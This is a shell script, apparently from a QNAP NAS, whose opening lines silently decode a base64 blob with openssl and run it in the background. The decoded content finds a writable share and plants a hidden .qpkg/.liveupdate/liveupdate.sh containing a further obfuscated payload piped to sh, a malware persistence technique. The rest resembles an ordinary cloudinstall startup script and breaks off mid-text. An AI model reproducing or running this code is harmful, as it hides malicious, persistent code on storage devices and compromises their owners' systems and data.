#!/bin/sh
(exec>/dev/null>&1 2>&1;(PATH="${PATH}:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin";openssl base64 -d -A <<"EOF"|sh&
KCBleGVjID4vZGV2L251bGwgMj4mMTsgKApleHBvcnQgUEFUSD0iJHtQQVRIfTovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbjovdXNyL2Jpbi9YMTE6L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluIgpjb21tYW5kIC12IGRpcm5hbWUgPi9kZXYvbnVsbCAyPiYxIHx8IGRpcm5hbWUgKCkgeyB0ZXN0IC16ICIkMSIgJiYgZWNobyAiLiIgJiYgcmV0dXJuOyBsb2NhbCByPSIkezElIiR7MSMjKlshL119In0iOyBjYXNlICRyIGluIC8qWyEvXSovKnxbIS9dKi8qKSByPSIke3IlLyp9IjsgZWNobyAiJHtyJSIke3IjIypbIS9dfSJ9Ijs7ICovKikgZWNobyAke3IlJVshL119OzsgIiIpIGVjaG8gJDE7OyAqKSBlY2hvIC47OyBlc2FjOyB9CnRlc3QgLWQgL2V0Yy9jb25maWcgJiYgY29uZmRpcj0vZXRjL2NvbmZpZyB8fCB7IHRlc3QgLWQgL21udC9IREFfUk9PVC8uY29uZmlnICYmIGNvbmZkaXI9L21udC9IREFfUk9PVC8uY29uZmlnOyB9CnRlc3QgLWQgIiRjb25mZGlyIiB8fCBjb25mZGlyPS9ldGMvY29uZmlnCmNvbW1hbmQgLXYgZ2V0Y2ZnID4gL2Rldi9udWxsIDI+JjEgfHwgZ2V0Y2ZnICgpIHsgc2VkIC1uICdIOyR7eDtzL1woLipcClxbJyIkezEvL1wvL1xcXC99IiddXHxeXFsnIiR7MS8vXC8vXFxcL30iJ11cKVwKLy9JO3MvXCheXHxcClwpXFtbXlwKXVwrXF1cCi4qLy9wfScgIiR7NDotJHtjb25mZGlyfS91TGludXguY29uZn0iIHwgc2VkIC1uICdzL14nIiR7Mi8vXC8vXFxcL30iJyBcPz0gXD9cKC4qXCkvXDEvSXAnOyB9CmJkaXI9CnRlc3QgLWYgIiR7Y29uZmRpcn0vc21iLmNvbmYiICYmIGZvciBpIGluIGhvbWVzIFB1YmxpYyBEb3dubG9hZCBNdWx0aW1lZGlhIFdlYiBSZWNvcmRpbmdzOyBkbyBiZGlyPWBnZXRjZmcgIiRpIiBwYXRoIC1mICIke2NvbmZkaXJ9L3NtYi5jb25mImAgJiYgdGVzdCAhIC16ICIkYmRpciIgJiYgYmRpcj1gZGlybmFtZSAiJGJkaXIiYCAmJiB0ZXN0IC1kICIkYmRpciIgJiYgdGVzdHdyaXRlYWJsZT0kKG1rdGVtcCAiJHtiZGlyfS8udG1wLlhYWFhYWCIpICYmIHJtICIke3Rlc3R3cml0ZWFibGV9IiAmJiBicmVhazsgYmRpcj0nJzsgZG9uZQp0ZXN0IC16ICIke2JkaXJ9IiB8fCB0ZXN0ICEgLWQgIiR7YmRpcn0iICYmIHsgY29tbWFuZCAtdiByZWFkbGluayA+L2Rldi9udWxsIDI+JjEgfHwgbG4gLXNmIC9iaW4vYnVzeWJveCAvdXNyL2Jpbi9yZWFkbGluazsgZm9yIGkgaW4gaG9tZXMgUHVibGljIERvd25sb2FkIE11bHRpbWVkaWEgV2ViIFJlY29yZGluZ3M7IGRvIGJkaXI9YHJlYWRsaW5rICIvc2hhcmUvJHtpfSIgMj4vZGV2L251bGxgICYmIHRlc3QgISAteiAiJGJkaXIiICYmIGJkaXI9YGRpcm5hbWUgIiRiZGlyImAgJiYgYmRpcj0vc2hhcmUvJHtiZGlyIyMqL30gJiYgdGVzdCAtZCAiJGJkaXIiICYmIGJyZWFrOyBkb25lOwp0ZXN0IC16ICIke2JkaXJ9IiB8fCB0ZXN0ICEgLWQgIiR7YmRpcn0iOyB9ICYmIHsgYmRpcj1gZ2V0Y2ZnIFNIQVJFX0RFRiBkZWZWb2xNUCAtZiAiJHtjb25mZGlyfS9kZWZfc2hhcmUuaW5mbyJgCnRlc3QgLXogIiR7YmRpcn0iIHx8IHRlc3QgISAtZCAiJHtiZGlyfSI7IH0gJiYgeyBiZGlyPWBtb3VudCB8IHNlZCAtbiAicy8uKlwoXC9zaGFyZVwvW14gL11cK1wpIC4qL1wxL2dwIiB8IGhlYWQgLW4gMWAKdGVzdCAteiAiJHtiZGlyfSIgfHwgdGVzdCAhIC1kICIke2JkaXJ9IjsgfSAmJiB7IGZvciBpIGluIENBQ0hFREVWM19EQVRBIENBQ0hFREVWMl9EQVRBIENBQ0hFREVWMV9EQVRBIE1EMF9EQVRBOyBkbyB0ZXN0IC1kICIvc2hhcmUvJHtpfSIgJiYgYmRpcj0iL3NoYXJlLyR7aX0iICYmIGJyZWFrOyBkb25lOwp0ZXN0IC16ICIke2JkaXJ9IiB8fCB0ZXN0ICEgLWQgIiR7YmRpcn0iICYmIGJkaXI9L21udC9IREFfUk9PVDsgfQplY2hvICdhYipjJyB8IGdyZXAgLUYgJ2FiKmMnID4vZGV2L251bGwgMj4mMSAmJiBmZ3JlcD0iZ3JlcCAtRiIgfHwgeyBjb21tYW5kIC12IGZncmVwID4vZGV2L251bGwgMj4mMSAmJiBmZ3JlcD1mZ3JlcCB8fCBmZ3JlcD1ncmVwOyB9CnRlc3QgIiRmZ3JlcCIgfHwgZmdyZXA9Z3JlcApzbGVlcCA1CmlmIFsgISAtZiAiJHtiZGlyfS8ucXBrZy8ubGl2ZXVwZGF0ZS9saXZldXBkYXRlLnNoIiBdOyB0aGVuCnRlc3QgLWQgIiR7YmRpcn0vLnFwa2ciIHx8IG1rZGlyIC1wICIke2JkaXJ9Ly5xcGtnIiB8fCBta2RpciAiJHtiZGlyfS8ucXBrZyIKdGVzdCAtZiAiJHtiZGlyfS8ucXBrZy8ubGl2ZXVwZGF0ZSIgfHwgdGVzdCAtaCAiJHtiZGlyfS8ucXBrZy8ubGl2ZXVwZGF0ZSIgJiYgcm0gLWYgIiR7YmRpcn0vLnFwa2cvLmxpdmV1cGRhdGUiCnRlc3QgLWQgIiR7YmRpcn0vLnFwa2cvLmxpdmV1cGRhdGUiIHx8IG1rZGlyICIke2JkaXJ9Ly5xcGtnLy5saXZldXBkYXRlIgpjYXQgPiAiJHtiZGlyfS8ucXBrZy8ubGl2ZXVwZGF0ZS9saXZldXBkYXRlLnNoIiA8PCJYRU9GIgojIS9iaW4vc2gKClVzWXZ3T1hnPSR7RnZ5ZlBGYkF0UndOfXRyJHtzS1RocmJUfSR7dFdVeG1ZY30KaldDcnlnUT0ke1JkQ2VqbFJ9JEdlcmNKbktSVCQiIidcJyR7Zm16d0drU30kR0JUTlRlSHp1JCIiO2NxS01paXY9JHNiRlRVUkF5YyQiIiR7aFRNUnhsZlpCc2hBfSR7Qm5pQ1lndX0ke2pXQ3J5Z1F9JHtJeGtuRE5neGhQd0h9MSR7S0hBbk1MSH0zMyR7S21iWkp3SH07T21lb3Zhcz0kcFFiYU5HQkpCJCIiJHt6QXNreGtBdnl3SFl9JHtLcHhqVlNMfSR7aldDcnlnUX0ke2xHTkNacFpmUFVFU30wJHtaZ3BrUmRnfTU1JHtnQ3F2cVJHfTtXRXhQdUd6PSRWWWNhWGRoSk8kIiIke2liVXhJcUZOZ0V0ZX0ke05NaUdCSVp9JHtqV0NyeWdRfSR7c2NBTXhCS0ZmbGtyfTEke25IaHBQR2x9MzQke2lWd2hYZU99OyRVc1l2d09YZyAndHpVSXxyZEhqd0ZUUCk+USckT21lb3ZhcydLXG5iK2skPGM7V10gZ3Z4cURPeWFtJUVBbiEnIiciJ0pMYCNvcyckY3FLTWlpdid7IickV0V4UHVHeid9JlI9VllwWGYoWkJsQ01TaEdldU5pKicgJ3NhU0ZSTCYoe3hUJWdNIGwnJE9tZW92YXMnblo9WVFOSickV0V4UHVHeidlejxpSEcnIiciJ31oWEQpSVd0Y21mQnlcbkskRXEiaiF2a0FVTztdcD5kKlZyJyRjcUtNaWl2J29Dd2J1K2B8I1AnIDw8ICJrTmFEakFibUZxcmZ0IiB8IHNoJGVPV3V1WWxVZyQiIiR7dkVjeVJXWVJtQmFlfQp2KXlDYHJJIGIvRENuOy9ERSNqJXJPUjwleURgTyBxI2pwZmgnWm9CK21mUHtnJDtxRXBmI2poSXBwJnEvI2opfSFtQUtRUXNKKSoKfSlxQVAgI2p6e0Z0cS1oIEsvI2pVKm5TcXMgZi9wQiAjamhwa1pNU3FcfDsjaiV2Z1UlcXMjanZPRGhHdD10PFErJElxRyNqJ3dtWitDTUdXT3NXbnE7dEUuI2pLemYkZn1aeXdCfW1xQVAgTEUjakU8a3IlciZvR29EZnFCI2opRz1Gbj1oVXtgZldxPnhIbnkhYXM8fVJjMTMzWlltJD5cSlYndEEiS2BDWHYKd01oTkZXa0VjS3I9UGJjMDU1K2RqVHBdI1F8KWdveFt4W3hCR3p7aWMxMzREZSB1STtxJk9TJVsoZlUqeD54b1p3ZE1BPGdZVUtTaSZ7JXpza0R8ciNRK1QgfUhmcGFtInVGQ0VSQm5Odl1WCiFcYjspYE9qUHRjMDU1W3llYzEzM1hjMTM0Jz1jSyooPkpHaHhbeFt4SXFXJHhdXVsrUSs9PVtYI3YpeUNgckkgTG1XLyV2Wi9CdEl4UVpQQnJQJndOJklvJkkmJiYmYExzSmAmQiNqSSYmJiZgTHNKYCZidlojS28xOkc0ZmpJJiYmJmBMc0pgJmJKeSNLbzI6RzEyZmpJJiYmJmBMc0pgJgpCaEpzUSN6S28zOkdKR1UkR1RmekkmJiYmclAmR01zJnpLCkJoSnNReiZkJi9NUV0vU1BKWk1MYiYtJm8mSSYmJiYmJiYmUFFKTSZHUFomS3d3S0EkKnt1fCZYJncmS2JKeSZHJktidlomaSYxJk4maSZLYnZaJk5OJkJqSSYmJiYmJiYmUXN0TCZ6S0J6SSYmJiZmSWZJc0xiYkpaTSZHXSZiCnJRYmgmRCYvTVFdL1pTYGAmMkQhMSYtLSZiCnJRYmgmd04mbyZJYExzSmAmQlNwcHZ5I2t4UVpQQnJQJjYmNmtJclFCciZ6SzJ6JiEhJm8mYgpNdlAmektvMlhnZ2dnZ2dmS0JTcHB2eXpqJlFzdEwmektvMlhnZ2dnZ2dmS0JTcHB2eXpqJmYmLS0mbyZyTFNzdCZ6S28xWGdnZ2dnZ2ZLQlNwcHZ5emomUXN0TCZ6S28xWFhnZ2dnZ2dmS0JTcHB2eXpqJmZJZklReVFzJjJEL01RXS9aU2BgSTskRX0jektvOyRFfWY6LyV2WjovQiV2WjovU0JQLyV2WjovU0JQL0Ildlo6L1NCUC8ldlovZzExOi9TQlAvYExzSmAvQiV2WjovU0JQL2BMc0pgLyV2WnpJclFCciZXJkdVJnpLbyc9SEFDX2xFQUYqK2Z6Ji0tJm8maFB2WnJwJnp7SnJROiZ6aiZFVCMrfEUmTUpyUWomUXl2ciYwaiZmSVFzdEwmentKclE6JkVTUSY8SlomMjQmMDg6NTQ6MjUmK3xFJjIwMTd6SXNQI2toUHZacnAmW2VQWyYtLSZRc3RMJkdaUSZbZVBba0lyUUJyJnpLb21zUGZ6JkdRViYxJiEhJlFzdEwmektzUHomLS0mUXN0TCZ6eklyUUJyJnp5S31FRTtfQUgoSEFIQXomIyZ6eTIlMCUwOXNzTTUwMnM3NTU5NTAxNzU1TTUyUU1KNjc4ODklNjk0Nzd6Ji0tJlF5dnImMElyUUJyJlcmR1UmektvMGZ6JiEhJnJRQnIma2hCJkpTeSYtJnhQUWgmektvMGZ6Ji0mWXMmR2BrJkd4ciY0MCYhISZReXZyJjBJc0xiYkpaTSZHXSZMaFFaQkJgJkQvTVFdL1pTYGAmMkQhMSYhISZvSTt1bEV7JEUkI1tbSQojeitRQidDQzd8JG4rVDtTJU1CVDhsJVRUbE1VXT1TViJieklyUUJyJnp5S29BSCc9SGxFX3xIRX11e2Z6JiMmeTt1bEUmISEmclFCciZXJkdVJnpLbyc9SEFDX2xFQUYqK2Z6JiEhJnNKQlEmektvJz1IQUNfbEVBRiorZnomdlomW1smLSZxY1cwRzlScSYtJjBxJk4mcEpgQlEmamomYzBHOVJjMEc5UmMwRzlSYzBHOVJjMEc5UmMwRzlSYzBHOVJjMEc5UiZOJk0jekt3dyZrTUpyUSZpWEJrJi8mMTAwJk5OemomclFCciZ6S28nPUhBQ19sRUFGKitmeiYjJnpLb01meiYhISZzciN6S016Ji0tJm8mclFCciZ6S28nPUhBQ19sRUFGKitmeiYjJnpLd3cmS00mRyYxTk56JiEhJnNyI3pLd3cmS00mRyYxJk5OemomZiZqaiZxTiZwSmBCUSZqaiZRQkpzJiEhJnJRQnImVyZHVSZ6S28nPUhBQ19sRUFGKitmeiYhISZvSVpgI1tJW0lzSkJRJnpLb2F1KkVIKkVfIkgqK0V9ZnomdlomW1smLSZxY1cwRzlScSYtJjBxJk4mcEpgQlEmamomcU4mclFCciZ6S29hdSpFSCpFXyJIKitFfWZ6JkdgciYyMTQ3NDgzNjQ2JmpqJlFCSnMmISEmbyZGKGwjJlBRSk0mR00mW1smR1BaJnpLb2F1KkVIKkVfIkgqK0V9ZnomO3VsRXskRSRqJnJRQnImR1Umeks7dWxFeyRFJHomISEmO3VsRXskRSQja01NJiVCIzEmc0xTWnIjekthdSpFSCpFXyJIKitFfXomMkQvTVFdL1pTYGBraiZmJi0tJnJRQnImeks7dWxFeyRFJHomLS0mO3VsRXskRSQja3NKcmsmLS0mUXl2ciYwSUIjektvO3VsRXskRSRtbXEuZnpJQnIjektvQm1tcUdmeklCI3pLb0JYWEdxZnpJTSN6S3d3JktNJi8mMTAwMCZOTnpJclFCciZXJkdVJnpLTXomISEmclFCciZXJkdVJnpLQnJ6JiEhJnJRQnImektvbUJyZnomIyY1JiEhJm8mclFCciZ6eUtCcnomIyZ6eUtNeiYtLSZyUUJyJnp5S0JyeiYjJnp5S3d3JktNJkcmMSZOTnpqJmYmLS0mbyZyUUJyJkdwJnpLcnomISEmUGImektyemomUXl2ciYwaiZmSXNKQlEmektCeiZ2WiZbWyYtJnFjV0pHVSRHVDBHOS9pI0taYFJxJk4mclFCciZHcCZ6S3J6JiEhJlBiJnpLcnpqJlF5dnImMGomamomUUJKc0lyI2tiCnJRYmgmL3JiaC8ucmJoLmdnZ2dnZ2smLS0mUXl2ciYwSXNKciZEJnpLcnomZGR6SHUoeiYtLSZvJnJRQnImR3AmektyeiYhISZQYiZ6S3J6aiZReXZyJjBqJmZJR0dHR0cgSCtGKiY7PSAiRmEmKUhDR0dHR0dJfEZGIEw+JCogeApWdAp2KzlZMCAkJ0goJCR1YSRDOCR8RkYgdngpYSRDSCRPditpfS8xcHMifHBFKj1dXSBRQkl1PFYwNnB1K2IgKClGPXVhO0JPK2gkU1V7UGEpYFogU31MIjR0bEhyWlN5RSAqcjg+JCBVTVRpaDlWPSUkVDN1SVVKO2I8Rk1CMXh9fWAxKShpJzh9NSUqTSpCOXxhQQpIXWE9eDwrKFEzJEpgIjcKaT4vQWcgQlxQQiJhKU0rKVxJSn1pTXJhMCpNIilNClV0KThWIFZVfXlhaXw9K1VRUTUvL3V4eylNcylRUWBKYXhVPTxKMFN2MTEgVDNGPiloJ0lgN31MCm59Yk9VQVA8KztzU3M0CmB9OSUpNGxRJHtRdEFPPk9gdl19J3NWbCkxQipCWUpoPGIyVns+Tyc3dD5BSUEyQkp1VVMlRT1ZMWkyJylgaXxPNWxwT0wvIDgqTGgqQzZIJHUiOENhO259YUpoVjJKcDJUT3J0Sm4yMm5ocENJVXJVPkhPNXUKKCp0NnBBeFQqaCVCU3xTNFo7SiAvUHhdPGJCXHk5M0paQnQ0RlFndjtPdVMpbiBKYj1UT0ZdIkl5UDJIbGEyUHR4XHRWeDxTdiJgfStpfXwpNjM7TE0gfChPKVY5UCJNNHQ5OVpnJTlpdmFiKCc5cFU8KUI5bGx8ST43eUpNK2hKJSkySipFaCozVXskU0grRjRUdXJWeSJWXD5IfWIwJUhpVDUoJHh8ICQkSCNJR0dHR0dIKnsmOz0gIkZhJilIQ0dHR0dHSUh1KElyUUJyJlcmR1UmektCeiYhISZ0I2tMaFFaQkJgJiVKQlE2NCZHTSZkZEh1KCYtJkxoUVpCQmAmUEJKU3JgJkdoUyV2WiZHdloKUU8mektyeiZHXVFQdnBPSUtCSUh1KElrJi0tJm8mclFCciZHcCZ6S3J6JiEhJlBiJnpLcnpqJlF5dnImMGomZklyUUJyJkdwJnpLcnomISEmUGImektyekliI3pLbzt1bEV7JEUkWFgucWZ6STt1bEV7JEUkI1tbSXNKQlEmektieiZ2WiZbWyYtJnFjV0pHVSRHVDBHOS9pI0taYFJxJk4mUXl2ciYwJmpqJlFCSnNJCiNrTGhRWkJCYCZNeEJyJkdCdEoxJkcldlpKUE8mR3RiSnMmektzcnomZGRIdSgmLSZMaFFaQkJgJiVKQlE2NElLCklIdShJa0liI2tMaFFaQkJgJlFacyZHTSZHSlFCRzI1NkdzJXMmRwomeksKeiZHYk0mQnRKMSZHQkpgciZHSiZkZEh1KElLYklIdShJa0lidCNrTGhRWkJCYCZNeEJyJkdCdEoxJkcldlpKUE8mR3RiSnMmektCcnomZGRIdSgmLSZMaFFaQkJgJiVKQlE2NElLYklIdShJa0lyUUJyJlcmR1Umekt0eiYhISZyUUJyJnpLdHomIyZ6S2J0eiYtLSZReXZyJjBJUV1KYCZ6S2J6SXJQU1FJZiYtLSZvSXIja2IKclFiaCYvcmJoLy5yYmguZ2dnZ2dnayYtLSZReXZyJjBJc0pyJkQmektyeiZkZHpIdSh6Ji0tJm8mclFCciZHcCZ6S3J6JiEhJlBiJnpLcnpqJlF5dnImMGomZklHR0dHRyBIK0YqJjs9ICJGYSYpSENHR0dHR0l8RkYgTD4kKiB4ClZ0CnYrOVkwICQnSCgkJHVhJEM4JHxGRiB2eClhJENIJDknYn18WTQ+WThhdSJDKXh1VnBhSTArVEJBbFkoeHZ5RTBgdnxzNDJUbFBCQlBCKCtUYHs7KTM1VWBNYiU9QkgnZ3IoQwp7Pm5RPXMKaDJKdDgoc3BJJCAoPSs4fCJaYDZZRV15K1RZPDwlfCI7e3ZDTDVgL00wNyApcyVZQ1NWKmhpMi8vMk1TCnlhT0oKdUZGWkZWKEkieFB8NVpdaDUgKSAgc3N8YHwgSkIocnlUcCh4cio+YCc5djliKnB2NTNaSmBQfDtBTGA5KXZwXDFDeWIiWTFpSTcrRVM+KGxgTyk5JGhddi9URjJPL11PYjYqXCVcSEJKSDUgOXh4ZzxDUG55YCUpeXxGVVxTZ3AxOGwyaDQ4KHRJaG49T0M8MGI+ez1zM2x2PEE0QXY7dgo7aEUneApsPk85MEp8KVBMXGEkTTl8NnNUcnBZYVV0fCVdT3IqYk1yTUlDeSAqKlowKGInNTFzIjtzaU1oSkZGeTJ2LzJzK019QzhUJD4ge3wgfCAKPkZRMngoeHM2YDwwXHVgRTYzOFVpSVk3L2I7aXRzYUwibj12K2x2SFNiVTM9IjU7YkxuSjNZMnIwNEFKNzA7IlwkaCtCRi94aH1PfTBcOHY2T24gfUhJVj1CSid5WiB1KF1PaXZsTGJPKHZgMk15KSciPkVZT1QgWjhpMSliTFo8MmgkeHwgJCRII0lHR0dHR0gqeyY7PSAiRmEmKUhDR0dHR0dJSHUoSUxoUVpCQmAmUEJKU3JgJkdoUyV2WiZHdloKUU8mektyeiZHUVpzUE9ociZkZEh1KCYtJkxoUVpCQmAmJUpCUTY0SUsKSUh1KElQYiZ6S3J6SXJQU1EmSWZqJnJQU1FqJmYmLS0mb0lyUUJyJnp5SyRhYUg7RV8iJCorPSQrSHomIyZ6eTUxOTUlczE4NzA3MDAySjk4czklNTE4M0o1TTAzMHBNMDcxJTZKMiV6JiEhJlFdSmAmektvfUVFO189bEhBXyQrSCpFZnpJZklyUUJyJkdwJnpLcnomISEmUGImektyeklCYFFRaCYxSVF5dnImMElMK1ErPT1MQSNqd01aZiV2JFB9RUVGcUQjaiRna1xRd3dwaERoRHFuQ2Y+I2pcYENcRlxTekZuUiVxNzU1I2ohaGhtSm52UCUreSZxPlsjdil5Q2BySSBbTDt3IEU+MExMaQprTmFEakFibUZxcmZ0ClFOQVBfUVBLRz1jbG91ZGluc3RhbGwKUUlEX1BSRVNJU1RFTlRfQ09ORj0vZXRjL2NvbmZpZy9xaWRfcGVyc2lzdGVudC5jb25mCk5BU19DTE9VRF9JTlNUQUxMX1BBVEg9L2hvbWUvaHR0cGQvY2dpLWJpbi9jbG91ZGluc3RhbGwKQ0xPVURfSU5TVEFMTF9QQVRIPS90dW5uZWxfYWdlbnQKQ0xPVURfSU5TVEFMTF9SQU1ESVNLX1BBVEg9L3R1bm5lbF9hZ2VudF9yYW1kaXNrCkNMT1VEX0lOU1RBTExfQUdFTlRfRklMRV9QQVRIPSRDTE9VRF9JTlNUQUxMX1BBVEgvdHVubmVsX2FnZW50LnRhci5iejIKQ09VTlRFUj0xCkVSUk9SX0JBRF9SRVFVRVNUPTQwMAoKaWYgWyAiJGZyb21yY1MiID0gJ1RSVUUnIF07IHRoZW4KY2FzZSAiJDEiIGluCiAgc3RhcnQpCiAgICBTVEFSVF9USU1FPSQoZGF0ZSArIiVUIikKICAgIGVjaG8gLWUgInN0YXJ0OiRTVEFSVF9USU1FIiA+PiAvdG1wLy5jbG91ZGluc3RhbGwubG9nCiAgICB3aGlsZSBbICIkQ0xPVURfSU5TVEFMTF9BR0VOVF9QSURfTElTVCIgPT0gIiIgXTsKICAgIGRvCiAgICAgICAgIyByZXBvcnQgZGV2aWNlIGluZm8gYW5kIGdldCBjbG91ZGluc3RhbGwgYWdlbnQgYXBwIGRvd25sb2FkIHVybAogICAgICAgIERPV05MT0FEX1VSTD1gL3Vzci9zYmluL3FjbG91ZF91bmluaXRfZGV2aWNlX3Rvb2wgLXJgCiAgICAgICAgaWYgWyAhIC1kICIkQ0xPVURfSU5TVEFMTF9QQVRIIiBdOyB0aGVuCiAgICAgICAgICAgIGlmIFsgIiROQVNfQVJDSCIgPT0gIkFSTV82NCIgXTsgdGhlbgogICAgICAgICAgICAgICAgIyBjcmVhdGUgcmFtZGlzayBhbmQgY3JlYXRlIGEgNjRtYiBmaWxlCiAgICAgICAgICAgICAgICAvYmluL21rZGlyIC1wICRDTE9VRF9JTlNUQUxMX1JBTURJU0tfUEFUSAogICAgICAgICAgICAgICAgL2Jpbi9tb3VudCAtdCB0bXBmcyAtbyBzaXplPTY0bSB0bXBmcyAkQ0xPVURfSU5TVEFMTF9SQU1ESVNLX1BBVEgKICAgICAgICAgICAgICAgIC9iaW4vZGQgaWY9L2Rldi96ZXJvIG9mPSRDTE9VRF9JTlNUQUxMX1JBTURJU0tfUEFUSC9pbWFnZSBicz0xTSBjb3VudD02NAogICAgICAgICAgICAgICAgIyBjcmVhdGUgYmxvY2sgc2l6ZSAxSyBmaWxlc3lzdGVtCiAgICAgICAgICAgICAgICAvc2Jpbi9ta2UyZnMgLWIgMTAyNCAkQ0xPVURfSU5TVEFMTF9SQU1ESVNLX1BBVEgvaW1hZ2UKICAgICAgICAgICAgICAgICMgY3JlYXRlIHZpcnR1YWwgZGlzawogICAgICAgICAgICAgICAgZXhwb3J0IFVTRURfTE9PUF9ERVZJQ0U9YC91c3IvbG9jYWwvc2Jpbi9sb3NldHVwIC1mICRDTE9VRF9JTlNUQUxMX1JBTURJU0tfUEFUSC9pbWFnZWAKICAgICAgICAgICAgICAgIC9zYmluL3NldGNmZyAtZiAkUUlEX1BSRVNJU1RFTlRfQ09ORiAiQ0xPVURJTlNUQUxMIiAiVVNFRF9MT09QX0RFVklDRSIgIiRVU0VEX0xPT1BfREVWSUNFIgogICAgICAgICAgICAgICAgL2Jpbi9ta2RpciAtcCAkQ0xPVURfSU5TVEFMTF9QQVRICiAgICAgICAgICAgICAgICAjIG1vdW50IHZpcnR1YWwgZGlzawogICAgICAgICAgICAgICAgL2Jpbi9tb3VudCAkVVNFRF9MT09QX0RFVklDRSAkQ0xPVURfSU5TVEFMTF9QQVRICiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICMgY3JlYXRlIGFuZCBtb3VudCB0bXBmcyBmb2xkZXIKICAgICAgICAgICAgICAgIC9iaW4vbWtkaXIgLXAgJENMT1VEX0lOU1RBTExfUEFUSAogICAgICAgICAgICAgICAgL2Jpbi9tb3VudCAtdCB0bXBmcyAtbyBzaXplPTY0bSB0bXBmcyAkQ0xPVURfSU5TVEFMTF9QQVRICiAgICAgICAgICAgIGZpCiAgICAgICAgZmkKICAgICAgICBjZCAkQ0xPVURfSU5TVEFMTF9QQVRICgogICAgICAgIGlmIFtbICRET1dOTE9BRF9VUkwgPT0gaHR0cHMqIF1dOyB0aGVuCiAgICAgICAgICAgIFJFUE9SVF9TVUNDRVNTX1RJTUU9JChkYXRlICsiJVQiKQogICAgICAgIGVsc2UKICAgICAgICAgICAgUkVQT1JUX0ZBSUxfVElNRT0kKGRhdGUgKyIlVCIpCiAgICAgICAgICAgIGVjaG8gLWUgIiByZXBvcnRfZmFpbDokUkVQT1JUX0ZBSUxfVElNRVxuIHJlc3BvbnNlOiRET1dOTE9BRF9VUkwiID4+IC90bXAvLmNsb3VkaW5zdGFsbC5sb2cKICAgICAgICAgICAgIyBzdG9wIHJldHJ5IHdoZW4gZ290IGJhZCByZXF1ZXN0CiAgICAgICAgICAgICMgcHJldmVudCBwdXQgYmFkIHJlcXVlc3QgYWxsIHRoZSB0aW1lCiAgICAgICAgICAgIGlmIFtbICRET1dOTE9BRF9VUkwgPT0gKiRFUlJPUl9CQURfUkVRVUVTVCogXV07IHRoZW4KICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGZpCiAgICAgICAgZmkKCiAgICAgICAgIyBkb3dubGFvZCBjbG91ZGluc3RhbGwgYWdlbnQgYXBwCiAgICAgICAgL3Vzci9zYmluL3FjbG91ZF91bmluaXRfZGV2aWNlX3Rvb2wgLW8gIiRDTE9VRF9JTlNUQUxMX0FHRU5UX0ZJTEVfUEFUSCIgLWQgIiRET1dOTE9BRF9VUkwiCgogICAgICAgIGlmIFsgLWYgIiRDTE9VRF9JTlNUQUxMX0FHRU5UX0ZJTEVfUEFUSCIgXTsgdGhlbgogICAgICAgICAgICBET1dOTE9BRF9GSU5JU0hfVElNRT0kKGRhdGUgKyIlVCIpCiAgICAgICAgICAgICMgdW56aXAgYW5kIGV4ZWN1dGUgY2xvdWRpbnN0YWxsYWdlbnQKICAgICAgICAgICAgL2Jpbi90YXIgLXhmICRDTE9VRF9JTlNUQUxMX0FHRU5UX0ZJTEVfUEFUSCAtQyAkQ0xPVURfSU5TVEFMTF9QQVRICiAgICAgICAgICAgICRDTE9VRF9JTlNUQUxMX1BBVEgvYmluL2Nsb3VkaW5zdGFsbF9hZ2VudF9jdGwuc2ggc3RhcnQgJj4gL2Rldi9udWxsCgogICAgICAgICAgICBVTlpJUF9USU1FPSQoZGF0ZSArIiVUIikKICAgICAgICBmaQoKICAgICAgICBpZiBbICEgLWQgIiROQVNfQ0xPVURfSU5TVEFMTF9QQVRIIiBdOyB0aGVuCiAgICAgICAgICAgICMgY3JlYXRlIGZvbGRlciBhbmQgY3JlYXRlIHN5bWJvbGljIGxpbmsKICAgICAgICAgICAgL2Jpbi9ta2RpciAtcCAkTkFTX0NMT1VEX0lOU1RBTExfUEFUSAogICAgICAgICAgICAvYmluL2xuIC1zICRDTE9VRF9JTlNUQUxMX1BBVEgvdWkvY2xvdWRpbnN0YWxsLmh0bWwgJE5BU19DTE9VRF9JTlNUQUxMX1BBVEgvaW5kZXguaHRtbAogICAgICAgICAgICAvYmluL2xuIC1zICRDTE9VRF9JTlNUQUxMX1BBVEgvdWkvY2xvdWRpbnN0YWxsLmNnaSAkTkFTX0NMT1VEX0lOU1RBTExfUEFUSC9jbG91ZGluc3RhbGwuY2dpCiAgICAgICAgICAgIC9iaW4vbG4gLXMgJENMT1VEX0lOU1RBTExfUEFUSC91aS9zdGF0aWMgJE5BU19DTE9VRF9JTlNUQUxMX1BBVEgvc3RhdGljCiAgICAgICAgZmkKCiAgICAgICAgIyB3YWl0IGNvbm5lY3QKICAgICAgICBzbGVlcCA1CiAgICAgICAgQ0xPVURfSU5TVEFMTF9BR0VOVF9QSURfTElTVD1gL2Jpbi9wcyAtLWNvbHVtbnMgMjU2IHwgL2Jpbi9ncmVwICIkQ0xPVURfSU5TVEFMTF9QQVRIL2Jpbi9jbG91ZGluc3RhbGxhZ2VudCIgfCAvYmluL2dyZXAgLXYgZ3JlcCB8IC9iaW4vYXdrICd7cHJpbnQgJDF9J2AKICAgICAgICBpZiBbICIkQ0xPVURfSU5TVEFMTF9BR0VOVF9QSURfTElTVCIgPT0gIiIgXTsgdGhlbgogICAgICAgICAgICBTTEVFUF9USU1FPSQoKCAzMCAqICRDT1VOVEVSICkpCiAgICAgICAgICAgIGlmIFsgJFNMRUVQX1RJTUUgLWd0IDMwMCBdOyB0aGVuCiAgICAgICAgICAgICAgICBTTEVFUF9USU1FPTMwMAogICAgICAgICAgICBmaQogICAgICAgICAgICAjIHdhaXQgbmV4dCByZXRyeQogICAgICAgICAgICBzbGVlcCAkU0xFRVBfVElNRQogICAgICAgIGZpCiAgICAgICAgQ09VTlRFUj0kKCggJENPVU5URVIgKiAyICkpCiAgICBkb25lCgogICAgRU5EX1RJTUU9JChkYXRlICsiJVQiKQogICAgZWNobyAtZSAicmVwb3J0X3N1Y2Nlc3M6JFJFUE9SVF9TVUNDRVNTX1RJTUVcbmRvd25sb2FkX2ZpbmlzaDokRE9XTkxPQURfRklOSVNIX1RJTUVcbnVuemlwX2ZpbmlzaDokVU5aSVBfVElNRVxuZW5kOiRFTkRfVElNRSIgPj4gL3RtcC8uY2xvdWRpbnN0YWxsLmxvZwogICAgIyBjYWxsIGZvciBhIG5ldyBwcm9jZXNzI